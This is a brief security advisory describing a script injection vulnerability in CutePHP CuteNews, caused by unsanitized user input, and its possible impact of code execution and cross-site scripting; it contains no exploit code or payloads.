A remote script injection vulnerability affects CutePHP CuteNews. This issue is due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical functionality.

An attacker may leverage this issue to inject arbitrary server-side scripts locally and client-side scripts remotely, potentially facilitating code execution with the privileges of the affected Web server and cross-site scripting attacks.
